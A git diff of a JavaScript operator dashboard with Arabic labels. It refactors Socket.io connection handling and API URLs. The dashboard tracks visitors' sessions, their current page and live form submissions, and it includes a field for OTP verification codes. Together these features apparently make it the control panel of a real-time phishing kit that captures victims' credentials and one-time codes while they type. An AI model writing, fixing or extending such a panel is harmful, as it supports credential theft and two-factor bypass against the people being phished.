@@ -38,24 +38,34 @@ const FORM_FIELD_LABELS = {
   otpCode: 'رمز التحقق'
 };
 
-const socket = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? io(DASHBOARD_CONFIG.API_URL, { 
-  transports: ['websocket', 'polling'],
-  withCredentials: true 
-}) : io({ 
-  transports: ['websocket', 'polling'],
-  withCredentials: true 
-});
+let socket = null;
+if (typeof io !== 'undefined') {
+  const instanceKey = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.INSTANCE_KEY) ? DASHBOARD_CONFIG.INSTANCE_KEY : '';
+  
+  socket = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? io(DASHBOARD_CONFIG.API_URL, { 
+    query: { instanceKey: instanceKey },
+    transports: ['websocket', 'polling'],
+    withCredentials: true 
+  }) : io({ 
+    query: { instanceKey: instanceKey },
+    transports: ['websocket', 'polling'],
+    withCredentials: true 
+  });
+
+  socket.on('connect', () => { 
+    console.log('Socket connected'); 
+    loadInitialData(); 
+  });
+  
+  socket.on('disconnect', () => { 
+    console.log('Socket disconnected'); 
+  });
+} else {
+  console.error("Socket.io script failed to load. The backend server might be down.");
+}
 
 let users = [];
 let currentUserData = null;
-
-socket.on('connect', () => { 
-  console.log('Socket connected'); 
-  loadInitialData(); 
-});
-socket.on('disconnect', () => { 
-  console.log('Socket disconnected'); 
-});
 
 async function loadInitialData() {
   await Promise.all([loadStats(), loadUsers(), loadConfig()]);
@@ -158,7 +168,8 @@ function renderUserList(list) {
 
 async function selectUser(sessionId) {
   try {
-    const res = await fetch(\`/api/user/\${sessionId}\`, { credentials: 'include' });
+    const apiUrl = typeof DASHBOARD_CONFIG !== 'undefined' ? DASHBOARD_CONFIG.API_URL : '';
+    const res = await fetch(`${apiUrl}/api/user/${sessionId}`, { credentials: 'include' });
     if(res.ok) {
         currentUserData = await res.json();
         
@@ -189,7 +200,7 @@ function renderChat(data) {
   const pageName = PAGE_LABELS[data.currentPage] || data.currentPage || '';
   const dotClass = data.isConnected ? 'success' : 'muted';
   const pageEl = document.getElementById('chat-page');
-  if(pageEl) pageEl.innerHTML = \`<span class="dot \${dotClass}"></span> \${escapeHtml(pageName)}\`;
+  if(pageEl) pageEl.innerHTML = `<span class="dot ${dotClass}"></span> ${escapeHtml(pageName)}`;
   
   const contactEl = document.getElementById('chat-contact');
   if(contactEl) contactEl.textContent = escapeHtml(data.email || data.phone || '');
@@ -212,8 +223,8 @@ function renderNavButtons(activePage) {
     }
     
     btn.innerHTML = `
-      <i class="fa \${page.icon}"></i>
-      \${page.name}
+      <i class="fa ${page.icon}"></i>
+      ${page.name}
       <span class="page-indicator"></span>
     `;
     
@@ -286,64 +297,66 @@ function setupSearch() {
   }
 }
 
-socket.on('user:connected', ({ sessionId, page }) => {
-  const user = users.find(u => u.sessionId === sessionId);
-  if(user) {
-    user.isConnected = true;
-    user.currentPage = page || user.currentPage;
-  } else {
-    loadUsers(); // load if new user
-  }
-  renderUserList(users);
-  loadStats();
-});
-
-socket.on('user:disconnected', ({ sessionId }) => {
-  const user = users.find(u => u.sessionId === sessionId);
-  if(user) {
-    user.isConnected = false;
+if (socket) {
+  socket.on('user:connected', ({ sessionId, page }) => {
+    const user = users.find(u => u.sessionId === sessionId);
+    if(user) {
+      user.isConnected = true;
+      user.currentPage = page || user.currentPage;
+    } else {
+      loadUsers(); // load if new user
+    }
     renderUserList(users);
+    loadStats();
+  });
+
+  socket.on('user:disconnected', ({ sessionId }) => {
+    const user = users.find(u => u.sessionId === sessionId);
+    if(user) {
+      user.isConnected = false;
+      renderUserList(users);
+      if(currentUserData && currentUserData.sessionId === sessionId) {
+        currentUserData.isConnected = false;
+        renderChat(currentUserData);
+      }
+    }
+    loadStats();
+  });
+
+  socket.on('user:page-change', ({ sessionId, page }) => {
+    const user = users.find(u => u.sessionId === sessionId);
+    if(user) {
+      user.currentPage = page;
+      renderUserList(users);
+      if(currentUserData && currentUserData.sessionId === sessionId) {
+        currentUserData.currentPage = page;
+        renderChat(currentUserData);
+      }
+    }
+  });
+
+  socket.on('user:form-submit', ({ sessionId, page, formData }) => {
     if(currentUserData && currentUserData.sessionId === sessionId) {
-      currentUserData.isConnected = false;
+      if(!currentUserData.formData) currentUserData.formData = {};
+      currentUserData.formData[page] = formData;
+      renderMessages(currentUserData.formData);
+    }
+  });
+
+  socket.on('user:update', ({ sessionId, page, formData }) => {
+    if(currentUserData && currentUserData.sessionId === sessionId) {
+      if(!currentUserData.formData) currentUserData.formData = {};
+      if (formData) currentUserData.formData[page] = formData;
+      if (page) currentUserData.currentPage = page;
       renderChat(currentUserData);
     }
-  }
-  loadStats();
-});
-
-socket.on('user:page-change', ({ sessionId, page }) => {
-  const user = users.find(u => u.sessionId === sessionId);
-  if(user) {
-    user.currentPage = page;
-    renderUserList(users);
-    if(currentUserData && currentUserData.sessionId === sessionId) {
-      currentUserData.currentPage = page;
-      renderChat(currentUserData);
+    const user = users.find(u => u.sessionId === sessionId);
+    if(user) {
+      if(page) user.currentPage = page;
+      renderUserList(users);
     }
-  }
-});
-
-socket.on('user:form-submit', ({ sessionId, page, formData }) => {
-  if(currentUserData && currentUserData.sessionId === sessionId) {
-    if(!currentUserData.formData) currentUserData.formData = {};
-    currentUserData.formData[page] = formData;
-    renderMessages(currentUserData.formData);
-  }
-});
-
-socket.on('user:update', ({ sessionId, page, formData }) => {
-  if(currentUserData && currentUserData.sessionId === sessionId) {
-    if(!currentUserData.formData) currentUserData.formData = {};
-    if (formData) currentUserData.formData[page] = formData;
-    if (page) currentUserData.currentPage = page;
-    renderChat(currentUserData);
-  }
-  const user = users.find(u => u.sessionId === sessionId);
-  if(user) {
-    if(page) user.currentPage = page;
-    renderUserList(users);
-  }
-});
+  });
+}
 
 function getInitials(name) {
   if(!name) return 'م';
